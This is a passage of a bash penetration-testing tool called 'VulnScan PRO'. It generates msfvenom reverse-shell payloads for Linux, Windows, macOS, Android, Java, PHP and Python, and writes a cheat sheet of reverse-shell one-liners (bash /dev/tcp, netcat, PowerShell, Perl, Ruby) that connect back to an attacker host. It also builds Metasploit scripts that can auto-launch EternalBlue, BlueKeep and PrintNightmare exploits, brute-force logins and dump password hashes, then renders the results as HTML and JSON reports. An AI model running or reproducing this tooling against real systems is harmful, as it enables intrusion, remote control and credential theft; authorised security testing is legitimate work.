            severity_add "$ip" "LOW" "Unknown service $service on port $port"
        fi
        ;;
    esac

    if [[ ${#suggestions[@]} -gt 0 ]]; then
        ATTACK_MAP["$ip"]+=$(printf '%s\n' "${suggestions[@]}")$'\n'
    fi
}

################################################################################
# PHASE 4 — PAYLOAD GENERATION
################################################################################
phase_generate_payloads() {
    [[ -z "$LHOST" ]] && return
    log STEP "Phase 4: Generating Payloads"
    local pdir="$OUTDIR/payloads"
    command -v msfvenom &>/dev/null || { log WARN "msfvenom not found, skipping payload gen"; return; }

    local lh="$LHOST"

    declare -A payloads=(
        ["linux_x64_elf"]="msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=$LPORT -f elf -o $pdir/shell_linux_x64.elf"
        ["linux_x86_elf"]="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lh LPORT=$LPORT -f elf -o $pdir/shell_linux_x86.elf"
        ["windows_x64_exe"]="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=$LPORT -f exe -o $pdir/shell_windows_x64.exe"
        ["windows_x86_exe"]="msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=$lh LPORT=$LPORT -f exe -o $pdir/shell_windows_x86.exe"
        ["windows_x64_dll"]="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=$LPORT -f dll -o $pdir/shell_windows_x64.dll"
        ["windows_x64_ps1"]="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=$LPORT -f psh -o $pdir/shell_windows_x64.ps1"
        ["java_war"]="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lh LPORT=$LPORT2 -f war -o $pdir/shell_java.war"
        ["php_reverse"]="msfvenom -p php/meterpreter_reverse_tcp LHOST=$lh LPORT=$LPORT -f raw -o $pdir/shell.php"
        ["python_reverse"]="msfvenom -p python/meterpreter_reverse_tcp LHOST=$lh LPORT=$LPORT -f raw -o $pdir/shell.py"
        ["macos_x64"]="msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=$LPORT -f macho -o $pdir/shell_macos"
        ["android_apk"]="msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$LPORT -o $pdir/shell.apk"
    )

    local plist_file="$pdir/payload_list.txt"
    {
        echo "=== Generated Payloads ==="
        echo "LHOST: $lh  LPORT: $LPORT  LPORT2: $LPORT2"
        echo "Generated: $(date)"
        echo ""
        echo "To generate all payloads, run:"
        echo ""
        for name in "${!payloads[@]}"; do
            echo "  # $name"
            echo "  ${payloads[$name]}"
            echo ""
        done

        echo ""
        echo "=== One-liner reverse shells ==="
        echo ""
        echo "Bash:"
        echo "  bash -i >& /dev/tcp/$lh/$LPORT 0>&1"
        echo ""
        echo "Python3:"
        echo "  python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$lh\",$LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"
        echo ""
        echo "Python2:"
        echo "  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lh\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        echo ""
        echo "Perl:"
        echo "  perl -e 'use Socket;\$i=\"$lh\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        echo ""
        echo "PHP:"
        echo "  php -r '\$sock=fsockopen(\"$lh\",$LPORT);\$proc=proc_open(\"/bin/sh -i\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'"
        echo ""
        echo "PowerShell:"
        echo "  powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$lh',$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\\$client.Close()\""
        echo ""
        echo "Netcat:"
        echo "  nc -e /bin/sh $lh $LPORT"
        echo "  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lh $LPORT >/tmp/f"
        echo ""
        echo "Ruby:"
        echo "  ruby -rsocket -e'f=TCPSocket.open(\"$lh\",$LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        echo ""
        echo "=== MSF Listener (multi/handler) ==="
        echo "  msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $lh; set LPORT $LPORT; set ExitOnSession false; run -j'"
        echo ""
        echo "=== nc listener ==="
        echo "  nc -nvlp $LPORT"
        echo "  rlwrap nc -nvlp $LPORT"

    } > "$plist_file"

    log OK "Payload list: $plist_file"
}

################################################################################
# PHASE 5 — AUTO EXPLOITATION (optional, --auto-exploit)
################################################################################
phase_auto_exploit() {
    [[ $AUTO_EXPLOIT -eq 0 ]] && return
    [[ ${#CONFIRMED_VULNS[@]} -eq 0 ]] && { log INFO "No confirmed exploitable vulns for auto-exploit."; return; }
    log STEP "Phase 5: Auto Exploitation (confirmed vulns only)"
    log WARN "Auto-exploit mode: running MSF against CONFIRMED vulnerabilities only"

    ask_continue "Proceed with auto-exploitation against ${#CONFIRMED_VULNS[@]} target(s)?" || return

    local lh="${LHOST:-127.0.0.1}"
    local auto_rc="$OUTDIR/msf_rc/auto_exploit.rc"
    {
        echo "# Auto-exploit RC — confirmed vulns only"
        echo "# Generated: $(date)"
        echo ""
        echo "setg LHOST $lh"
        echo "setg LPORT $LPORT"
        echo "setg ExitOnSession false"
        echo ""

        for entry in "${CONFIRMED_VULNS[@]}"; do
            local ip port vuln
            ip=$(echo "$entry" | cut -d: -f1)
            port=$(echo "$entry" | cut -d: -f2)
            vuln=$(echo "$entry" | cut -d: -f3)

            case "$vuln" in
                MS17-010|CVE-2017-0144)
                    echo "use exploit/windows/smb/ms17_010_eternalblue"
                    echo "set RHOSTS $ip"
                    echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp"
                    echo "run -j"
                    echo "" ;;
                CVE-2019-0708)
                    echo "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
                    echo "set RHOSTS $ip"
                    echo "set TARGET 2"
                    echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp"
                    echo "run -j"
                    echo "" ;;
                CVE-2021-34527)
                    echo "use exploit/windows/dcerpc/cve_2021_1675_printnightmare"
                    echo "set RHOSTS $ip"
                    echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp"
                    echo "run -j"
                    echo "" ;;
                CVE-2014-0160)
                    echo "use auxiliary/scanner/ssl/openssl_heartbleed"
                    echo "set RHOSTS $ip"
                    echo "set RPORT $port"
                    echo "set VERBOSE true"
                    echo "run"
                    echo "" ;;
            esac
        done

        echo "sleep 5"
        echo "sessions -l"

    } > "$auto_rc"

    log OK "Auto-exploit RC: $auto_rc"
    log INFO "Run: msfconsole -r $auto_rc"

    if command -v msfconsole &>/dev/null; then
        ask_continue "Launch msfconsole now with auto-exploit RC?" && {
            log INFO "Launching msfconsole..."
            msfconsole -r "$auto_rc"
        }
    fi
}

################################################################################
# MSF RC GENERATION (per-host)
################################################################################
generate_msf_rc() {
    [[ $GENERATE_MSF_RC -eq 0 ]] && return
    log STEP "Generating Metasploit RC Files"
    local lh="${LHOST:-LHOST}"

    for ip in "${!ATTACK_MAP[@]}"; do
        local rc_file="$OUTDIR/msf_rc/${ip//\//_}_full.rc"
        {
            echo "# ============================================"
            echo "# MSF Resource Script for: $ip"
            echo "# OS: ${OS_MAP[$ip]:-Unknown}"
            echo "# Hostname: ${HOSTNAME_MAP[$ip]:-N/A}"
            echo "# Ports: ${OPEN_PORTS_MAP[$ip]:-N/A}"
            echo "# Generated: $(date)"
            echo "# ============================================"
            echo ""
            echo "setg RHOSTS $ip"
            echo "setg LHOST $lh"
            echo "setg LPORT $LPORT"
            echo "setg ExitOnSession false"
            echo ""

            local ports="${OPEN_PORTS_MAP[$ip]:-}"
            for port in $ports; do
                local svc_entry="${SERVICE_MAP["${ip}:${port}"]:-}"
                local svc; svc=$(echo "$svc_entry" | cut -d'|' -f1)
                case "$port" in
                    21)
                        echo "# --- FTP ---"
                        echo "use auxiliary/scanner/ftp/anonymous"
                        echo "set RPORT 21"
                        echo "run"
                        echo ""
                        echo "use auxiliary/scanner/ftp/ftp_login"
                        echo "set RPORT 21"
                        echo "set USER_FILE $WORDLIST_USERS"
                        echo "set PASS_FILE $WORDLIST_PASS"
                        echo "set VERBOSE false"
                        echo "run"
                        echo "" ;;
                    22)
                        echo "# --- SSH ---"
                        echo "use auxiliary/scanner/ssh/ssh_version"
                        echo "run"
                        echo ""
                        echo "use auxiliary/scanner/ssh/ssh_enumusers"
                        echo "set USER_FILE $WORDLIST_USERS"
                        echo "run"
                        echo ""
                        echo "use auxiliary/scanner/ssh/ssh_login"
                        echo "set RPORT $port"
                        echo "set USER_FILE $WORDLIST_USERS"
                        echo "set PASS_FILE $WORDLIST_PASS"
                        echo "set VERBOSE false"
                        echo "set STOP_ON_SUCCESS true"
                        echo "run"
                        echo "" ;;
                    23)
                        echo "# --- Telnet ---"
                        echo "use auxiliary/scanner/telnet/telnet_login"
                        echo "set USER_FILE $WORDLIST_USERS"
                        echo "set PASS_FILE $WORDLIST_PASS"
                        echo "run"
                        echo "" ;;
                    139|445)
                        echo "# --- SMB ---"
                        echo "use auxiliary/scanner/smb/smb_version"
                        echo "run"
                        echo ""
                        echo "use auxiliary/scanner/smb/smb_enumshares"
                        echo "run"
                        echo ""
                        echo "use auxiliary/scanner/smb/smb_enumusers"
                        echo "run"
                        echo ""
                        echo "use auxiliary/scanner/smb/smb_login"
                        echo "set USER_FILE $WORDLIST_USERS"
                        echo "set PASS_FILE $WORDLIST_PASS"
                        echo "set VERBOSE false"
                        echo "run"
                        echo ""
                        # Auto-add EternalBlue if detected
                        local cves_smb="${CVE_MAP["${ip}:${port}"]:-}"
                        if echo "${CONFIRMED_VULNS[*]:-}" | grep -q "${ip}:${port}:MS17-010" || \
                           echo "$cves_smb" | grep -q "CVE-2017-0144"; then
                            echo "# EternalBlue CONFIRMED"
                            echo "use exploit/windows/smb/ms17_010_eternalblue"
                            echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp"
                            echo "run"
                            echo ""
                        fi ;;
                    3306)
                        echo "# --- MySQL ---"
                        echo "use auxiliary/scanner/mysql/mysql_login"
                        echo "set USERNAME root"
                        echo "set BLANK_PASSWORDS true"
                        echo "set USER_FILE $WORDLIST_USERS"
                        echo "set PASS_FILE $WORDLIST_PASS"
                        echo "set VERBOSE false"
                        echo "run"
                        echo ""
                        echo "use auxiliary/scanner/mysql/mysql_hashdump"
                        echo "run"
                        echo "" ;;
                    5432)
                        echo "# --- PostgreSQL ---"
                        echo "use auxiliary/scanner/postgres/postgres_login"
                        echo "run"
                        echo ""
                        echo "use auxiliary/scanner/postgres/postgres_hashdump"
                        echo "run"
                        echo "" ;;
                    1433)
                        echo "# --- MSSQL ---"
                        echo "use auxiliary/scanner/mssql/mssql_login"
                        echo "run"
                        echo ""
                        echo "use auxiliary/admin/mssql/mssql_enum"
                        echo "run"
                        echo "" ;;
                    3389)
                        echo "# --- RDP ---"
                        echo "use auxiliary/scanner/rdp/rdp_scanner"
                        echo "set RPORT 3389"
                        echo "run"
                        echo "" ;;
                    161)
                        echo "# --- SNMP ---"
                        echo "use auxiliary/scanner/snmp/snmp_enum"
                        echo "run"
                        echo ""
                        echo "use auxiliary/scanner/snmp/snmp_login"
                        echo "run"
                        echo "" ;;
                    5985|5986)
                        echo "# --- WinRM ---"
                        echo "use auxiliary/scanner/winrm/winrm_login"
                        echo "set RPORT $port"
                        echo "set USER_FILE $WORDLIST_USERS"
                        echo "set PASS_FILE $WORDLIST_PASS"
                        echo "run"
                        echo "" ;;
                esac
            done

            echo ""
            echo "# End of RC for $ip"

        } > "$rc_file"
        log OK "  RC file: $rc_file  → msfconsole -r $rc_file"
    done
}

################################################################################
# JSON REPORT
################################################################################
generate_json_report() {
    [[ $GENERATE_JSON -eq 0 ]] && return
    log STEP "Generating JSON Report"
    local json_file="$OUTDIR/report.json"
    {
        echo "{"
        echo "  \"scan_meta\": {"
        echo "    \"version\": \"$VERSION\","
        echo "    \"target\": \"$TARGET\","
        echo "    \"mode\": \"$SCAN_MODE\","
        echo "    \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\","
        echo "    \"hosts_scanned\": $HOSTS_SCANNED,"
        echo "    \"total_vulns\": $TOTAL_VULNS,"
        echo "    \"critical\": $CRITICAL_COUNT,"
        echo "    \"high\": $HIGH_COUNT,"
        echo "    \"medium\": $MEDIUM_COUNT,"
        echo "    \"low\": $LOW_COUNT"
        echo "  },"
        echo "  \"hosts\": ["

        local first_host=1
        for ip in "${!ATTACK_MAP[@]}"; do
            [[ $first_host -eq 0 ]] && echo "    ,"
            first_host=0
            local ports_json=""
            local first_port=1
            for port in ${OPEN_PORTS_MAP[$ip]:-}; do
                [[ $first_port -eq 0 ]] && ports_json+=","
                first_port=0
                local svc_entry="${SERVICE_MAP["${ip}:${port}"]:-}"
                local svc; svc=$(echo "$svc_entry" | cut -d'|' -f1 | sed 's/"/\\"/g')
                local prod; prod=$(echo "$svc_entry" | cut -d'|' -f2 | sed 's/"/\\"/g')
                local ver; ver=$(echo "$svc_entry" | cut -d'|' -f3 | sed 's/"/\\"/g')
                ports_json+="\"$port\": {\"service\": \"$svc\", \"product\": \"$prod\", \"version\": \"$ver\"}"
            done

            local cves_json=""
            for key in "${!CVE_MAP[@]}"; do
                [[ "$key" == "$ip:"* ]] && {
                    for cve in ${CVE_MAP[$key]}; do
                        cves_json+="\"$cve\","
                    done
                }
            done
            cves_json="${cves_json%,}"

            local creds_json=""
            for key in "${!CRED_MAP[@]}"; do
                [[ "$key" == "$ip:"* ]] && {
                    local p; p=$(echo "$key" | cut -d: -f2 | cut -d_ -f1)
                    creds_json+="\"$p\": \"${CRED_MAP[$key]}\","
                }
            done
            creds_json="${creds_json%,}"

            echo "    {"
            echo "      \"ip\": \"$ip\","
            echo "      \"hostname\": \"${HOSTNAME_MAP[$ip]:-}\","
            echo "      \"os\": \"${OS_MAP[$ip]:-unknown}\","
            echo "      \"ports\": {${ports_json}},"
            echo "      \"cves\": [${cves_json}],"
            echo "      \"default_creds_found\": {${creds_json}}"
            echo "    }"
        done

        echo "  ],"
        echo "  \"confirmed_vulns\": ["
        local first_cv=1
        for cv in "${CONFIRMED_VULNS[@]}"; do
            [[ $first_cv -eq 0 ]] && echo "    ,"
            first_cv=0
            echo "    \"$cv\""
        done
        echo "  ]"
        echo "}"
    } > "$json_file"
    log OK "JSON report: $json_file"
}

################################################################################
# HTML REPORT
################################################################################
generate_html_report() {
    [[ $GENERATE_HTML -eq 0 ]] && return
    log STEP "Generating HTML Report"
    local html_file="$OUTDIR/report.html"
    local ts; ts=$(date '+%Y-%m-%d %H:%M:%S')

    cat > "$html_file" << 'HTMLSTART'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VulnScan PRO Report</title>
<style>
:root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--bg4:#0a0d12;
  --border:#30363d;--text:#c9d1d9;--muted:#8b949e;
  --red:#f85149;--orange:#e3b341;--yellow:#d29922;
  --green:#3fb950;--blue:#58a6ff;--purple:#bc8cff;
  --cyan:#39d0d8;--white:#ffffff}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',monospace;font-size:14px}
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:var(--bg2)}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
header{background:linear-gradient(135deg,var(--bg4),var(--bg2));border-bottom:2px solid var(--cyan);padding:24px 40px}
header h1{color:var(--cyan);font-size:28px;letter-spacing:3px;text-shadow:0 0 20px rgba(57,208,216,.4)}
header .meta{color:var(--muted);margin-top:8px;font-size:12px;display:flex;gap:24px;flex-wrap:wrap}
header .meta span{display:flex;align-items:center;gap:6px}
.container{max-width:1600px;margin:0 auto;padding:24px 40px}
.summary-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:16px;margin:24px 0}
.stat-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px;text-align:center;transition:transform .2s}
.stat-card:hover{transform:translateY(-2px)}
.stat-card .num{font-size:40px;font-weight:bold;line-height:1}
.stat-card .lbl{color:var(--muted);font-size:11px;margin-top:6px;text-transform:uppercase;letter-spacing:1.5px}
.c-crit .num{color:var(--red);text-shadow:0 0 15px rgba(248,81,73,.5)}
.c-high .num{color:var(--orange)}
.c-med  .num{color:var(--yellow)}
.c-low  .num{color:var(--green)}
.c-info .num{color:var(--blue)}
.host-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;margin:20px 0;overflow:hidden;transition:border-color .2s}
.host-card:hover{border-color:var(--cyan)}
.host-header{background:linear-gradient(90deg,var(--bg3),var(--bg2));padding:16px 24px;display:flex;align-items:center;gap:16px;flex-wrap:wrap;border-bottom:1px solid var(--border);cursor:pointer}
.host-ip{color:var(--blue);font-size:20px;font-weight:bold;font-family:monospace}
.host-os{color:var(--muted);font-size:12px;margin-left:auto}
.badge{display:inline-block;padding:3px 10px;border-radius:14px;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px}
.b-crit{background:rgba(248,81,73,.15);color:var(--red);border:1px solid var(--red)}
.b-high{background:rgba(227,179,65,.15);color:var(--orange);border:1px solid var(--orange)}
.b-med {background:rgba(210,153,34,.15);color:var(--yellow);border:1px solid var(--yellow)}
.b-low {background:rgba(63,185,80,.15);color:var(--green);border:1px solid var(--green)}
.host-body{display:block}
.section{padding:14px 24px;border-bottom:1px solid var(--border)}
.section:last-child{border-bottom:none}
.section-label{color:var(--cyan);font-size:10px;text-transform:uppercase;letter-spacing:2px;margin-bottom:8px;font-weight:600}
.tags{display:flex;flex-wrap:wrap;gap:6px}
.tag-port{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:3px 10px;font-size:12px;font-family:monospace;color:var(--purple)}
.tag-cve{background:rgba(248,81,73,.1);border:1px solid var(--red);color:var(--red);border-radius:4px;padding:3px 10px;font-size:11px;font-family:monospace}
.tag-tech{background:rgba(88,166,255,.1);border:1px solid var(--blue);color:var(--blue);border-radius:4px;padding:3px 10px;font-size:11px}
.tag-cred{background:rgba(63,185,80,.1);border:1px solid var(--green);color:var(--green);border-radius:4px;padding:3px 10px;font-size:11px}
.attacks-block{padding:16px 24px}
pre.attack-pre{background:#010409;border:1px solid var(--border);border-radius:8px;padding:16px;overflow-x:auto;font-size:12px;line-height:1.7;color:#e6edf3;white-space:pre-wrap;word-break:break-all}
.filter-bar{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:12px 20px;margin:16px 0;display:flex;gap:16px;align-items:center;flex-wrap:wrap}
.filter-bar input{background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);padding:8px 12px;font-size:13px;width:280px}
.filter-btn{padding:7px 16px;border-radius:6px;border:1px solid var(--border);background:var(--bg3);color:var(--text);cursor:pointer;font-size:12px;transition:border-color .2s}
.filter-btn:hover,.filter-btn.active{border-color:var(--cyan);color:var(--cyan)}
.progress-bar{background:var(--bg3);border-radius:4px;height:6px;margin-top:8px;overflow:hidden}
.progress-fill{height:100%;background:linear-gradient(90deg,var(--cyan),var(--blue));border-radius:4px}
footer{text-align:center;padding:32px;color:var(--muted);font-size:12px;border-top:1px solid var(--border);margin-top:40px}
.cve-link{color:var(--red);text-decoration:none}
.cve-link:hover{text-decoration:underline}
.copyable{cursor:pointer;position:relative}
.copyable::after{content:'📋';position:absolute;right:8px;top:8px;opacity:0.4;font-size:14px}
.copyable:hover::after{opacity:1}
@media (max-width:768px){
  .summary-grid{grid-template-columns:repeat(2,1fr)}
  header .meta{flex-direction:column;gap:8px}
  .container{padding:16px}
}
</style>
</head>
<body>
HTMLSTART

    echo "<header>" >> "$html_file"
    echo "  <h1>⚡ VULNSCAN PRO</h1>" >> "$html_file"
    echo "  <div class=\"meta\">" >> "$html_file"
    echo "    <span>🎯 Target: <strong>$TARGET</strong></span>" >> "$html_file"
    echo "    <span>🕐 $ts</span>" >> "$html_file"
    echo "    <span>⚙️ Mode: $SCAN_MODE</span>" >> "$html_file"
    echo "    <span>🔢 Hosts: $HOSTS_SCANNED</span>" >> "$html_file"
    echo "    <span>🔧 v${VERSION}</span>" >> "$html_file"
    echo "  </div>" >> "$html_file"
    echo "</header>" >> "$html_file"
    echo "<div class=\"container\">" >> "$html_file"

    echo "<div class=\"summary-grid\">" >> "$html_file"
    echo "  <div class=\"stat-card c-crit\"><div class=\"num\">$CRITICAL_COUNT</div><div class=\"lbl\">Critical</div><div class=\"progress-bar\"><div class=\"progress-fill\" style=\"width:$(( CRITICAL_COUNT > 0 ? (CRITICAL_COUNT * 100 / (TOTAL_VULNS > 0 ? TOTAL_VULNS : 1)) : 0 ))%\"></div></div></div>" >> "$html_file"
    echo "  <div class=\"stat-card c-high\"><div class=\"num\">$HIGH_COUNT</div><div class=\"lbl\">High</div><div class=\"progress-bar\"><div class=\"progress-fill\" style=\"width:$(( HIGH_COUNT > 0 ? (HIGH_COUNT * 100 / (TOTAL_VULNS > 0 ? TOTAL_VULNS : 1)) : 0 ))%\"></div></div></div>" >> "$html_file"
    echo "  <div class=\"stat-card c-med\"><div class=\"num\">$MEDIUM_COUNT</div><div class=\"lbl\">Medium</div><div class=\"progress-bar\"><div class=\"progress-fill\" style=\"width:$(( MEDIUM_COUNT > 0 ? (MEDIUM_COUNT * 100 / (TOTAL_VULNS > 0 ? TOTAL_VULNS : 1)) : 0 ))%\"></div></div></div>" >> "$html_file"
    echo "  <div class=\"stat-card c-low\"><div class=\"num\">$LOW_COUNT</div><div class=\"lbl\">Low</div><div class=\"progress-bar\"><div class=\"progress-fill\" style=\"width:$(( LOW_COUNT > 0 ? (LOW_COUNT * 100 / (TOTAL_VULNS > 0 ? TOTAL_VULNS : 1)) : 0 ))%\"></div></div></div>" >> "$html_file"
    echo "  <div class=\"stat-card c-info\"><div class=\"num\">$TOTAL_VULNS</div><div class=\"lbl\">Total</div><div class=\"progress-bar\"><div class=\"progress-fill\" style=\"width:100%\"></div></div></div>" >> "$html_file"
    echo "</div>" >> "$html_file"

    echo "<div class=\"filter-bar\">" >> "$html_file"
    echo "  <input type=\"text\" id=\"searchBox\" placeholder=\"🔍 Filter hosts, CVEs, ports...\" oninput=\"filterHosts()\">" >> "$html_file"
    echo "  <button class=\"filter-btn active\" onclick=\"filterBySev('all',this)\">All</button>" >> "$html_file"
    echo "  <button class=\"filter-btn\" onclick=\"filterBySev('critical',this)\">Critical</button>" >> "$html_file"
    echo "  <button class=\"filter-btn\" onclick=\"filterBySev('high',this)\">High</button>" >> "$html_file"
    echo "  <button class=\"filter-btn\" onclick=\"filterBySev('medium',this)\">Medium</button>" >> "$html_file"
    echo "  <button class=\"filter-btn\" onclick=\"filterBySev('low',this)\">Low</button>" >> "$html_file"
    echo "</div>" >> "$html_file"

    for ip in "${!ATTACK_MAP[@]}"; do
        local os_str="${OS_MAP[$ip]:-Unknown OS}"
        local hostname_str="${HOSTNAME_MAP[$ip]:-}"
        local ports_str="${OPEN_PORTS_MAP[$ip]:-}"
        local attacks_escaped
        attacks_escaped=$(echo "${ATTACK_MAP[$ip]}" | sed 's/\x1b\[[0-9;]*m//g' | sed 's/</\&lt;/g; s/>/\&gt;/g')

        local host_sev="low"
        for key in "${!SEVERITY_MAP[@]}"; do
            [[ "$key" == "${ip}_CRITICAL"* ]] && { host_sev="critical"; break; }
            [[ "$key" == "${ip}_HIGH"*     && "$host_sev" != "critical" ]] && host_sev="high"
            [[ "$key" == "${ip}_MEDIUM"*   && "$host_sev" != "critical" && "$host_sev" != "high" ]] && host_sev="medium"
        done
        local badge_class badge_label
        case "$host_sev" in
            critical) badge_class="b-crit"; badge_label="CRITICAL" ;;
            high)     badge_class="b-high"; badge_label="HIGH" ;;
            medium)   badge_class="b-med";  badge_label="MEDIUM" ;;
            *)        badge_class="b-low";  badge_label="LOW" ;;
        esac

        echo "<div class=\"host-card\" data-sev=\"$host_sev\" data-ip=\"$ip\" data-text=\"$ip ${hostname_str:-} ${ports_str:-}\">" >> "$html_file"
        echo "  <div class=\"host-header\" onclick=\"toggleBody(this)\">" >> "$html_file"
        echo "    <span class=\"host-ip\">$ip</span>" >> "$html_file"
        echo "    <span class=\"badge $badge_class\">$badge_label</span>" >> "$html_file"
        [[ -n "$hostname_str" ]] && echo "    <span class=\"badge\" style=\"background:var(--bg3);border-color:var(--border);color:var(--muted)\">$hostname_str</span>" >> "$html_file"
        echo "    <span class=\"host-os\">$os_str</span>" >> "$html_file"
        echo "  </div>" >> "$html_file"
        echo "  <div class=\"host-body\">" >> "$html_file"

        if [[ -n "$ports_str" ]]; then
            echo "  <div class=\"section\"><div class=\"section-label\">Open Ports</div><div class=\"tags\">" >> "$html_file"
            for port in $ports_str; do
                local svc_e="${SERVICE_MAP["${ip}:${port}"]:-}"
                local svc_n; svc_n=$(echo "$svc_e" | cut -d'|' -f1)
                echo "    <span class=\"tag-port\">$port${svc_n:+/$svc_n}</span>" >> "$html_file"
            done
            echo "  </div></div>" >> "$html_file"
        fi

        local has_cves=0
        for key in "${!CVE_MAP[@]}"; do
            [[ "$key" == "$ip:"* ]] && has_cves=1 && break
        done
        if [[ $has_cves -eq 1 ]]; then
            echo "  <div class=\"section\"><div class=\"section-label\">CVEs Detected</div><div class=\"tags\">" >> "$html_file"
            for key in "${!CVE_MAP[@]}"; do
                [[ "$key" == "$ip:"* ]] && for cve in ${CVE_MAP[$key]}; do
                    echo "    <a href=\"https://nvd.nist.gov/vuln/detail/$cve\" class=\"cve-link tag-cve\" target=\"_blank\">$cve</a>" >> "$html_file"
                done
            done
            echo "  </div></div>" >> "$html_file"
        fi

        local tech_str="${TECH_MAP["${ip}:80"]:-}${TECH_MAP["${ip}:443"]:-}${TECH_MAP["${ip}:8080"]:-}"
        [[ -n "$tech_str" ]] && {
            echo "  <div class=\"section\"><div class=\"section-label\">Tech Stack</div><div class=\"tags\">" >> "$html_file"
            for t in $tech_str; do echo "    <span class=\"tag-tech\">$t</span>" >> "$html_file"; done
            echo "  </div></div>" >> "$html_file"
        }

        local has_creds=0
        for key in "${!CRED_MAP[@]}"; do [[ "$key" == "$ip:"* ]] && has_creds=1 && break; done
        if [[ $has_creds -eq 1 ]]; then
            echo "  <div class=\"section\"><div class=\"section-label\">Default/Weak Creds Found</div><div class=\"tags\">" >> "$html_file"
            for key in "${!CRED_MAP[@]}"; do
                [[ "$key" == "$ip:"* ]] && {
                    local p; p=$(echo "$key" | grep -oP ':\K\d+(?=_)')
                    echo "    <span class=\"tag-cred\">port $p: ${CRED_MAP[$key]}</span>" >> "$html_file"
                }
            done
            echo "  </div></div>" >> "$html_file"
        fi

        echo "  <div class=\"attacks-block\"><div class=\"section-label\">Attack Commands</div>" >> "$html_file"
        echo "  <pre class=\"attack-pre copyable\" onclick=\"copyPre(this)\">$attacks_escaped</pre>" >> "$html_file"

        if [[ -n "${POSTEXPLOIT_MAP[$ip]:-}" ]]; then
            local pe_escaped
            pe_escaped=$(echo "${POSTEXPLOIT_MAP[$ip]}" | sed 's/LHOST/'"$LHOST"'/g; s/LPORT/'"$LPORT"'/g' | sed 's/</\&lt;/g; s/>/\&gt;/g')
            echo "  <div class=\"section-label\" style=\"margin-top:16px\">Post-Exploitation Hints</div>" >> "$html_file"
            echo "  <pre class=\"attack-pre\">$pe_escaped</pre>" >> "$html_file"
        fi

        echo "  </div></div></div>" >> "$html_file"
    done

    cat >> "$html_file" << 'JSFOOT'
</div>
<footer>VulnScan PRO — Authorized testing only &nbsp;|&nbsp; CVE links → NVD</footer>
<script>
function toggleBody(hdr){
  const b=hdr.nextElementSibling;
  b.style.display=b.style.display==='none'?'block':'none';
}
function filterHosts(){
  const q=document.getElementById('searchBox').value.toLowerCase();
  document.querySelectorAll('.host-card').forEach(c=>{
    c.style.display=c.dataset.text.toLowerCase().includes(q)?'':'none';
  });
}
function filterBySev(sev,btn){
  document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  document.querySelectorAll('.host-card').forEach(c=>{
    c.style.display=(sev==='all'||c.dataset.sev===sev)?'':'none';
  });
}
function copyPre(el){
  navigator.clipboard.writeText(el.innerText).then(()=>{
    const orig=el.style.borderColor;
    el.style.borderColor='var(--cyan)';
    setTimeout(()=>el.style.borderColor=orig,600);
  });
}
</script>
</body></html>
JSFOOT

    log OK "HTML report: $html_file"
}

################################################################################
# TEXT REPORT
################################################################################
generate_text_report() {
    local report_file="$OUTDIR/attack_suggestions.txt"
    {
        echo "╔══════════════════════════════════════════════════════════╗"
        echo "║        VulnScan PRO — Penetration Test Report           ║"
        echo "╚══════════════════════════════════════════════════════════╝"
        echo "  Generated  : $(date)"
        echo "  Target     : $TARGET"
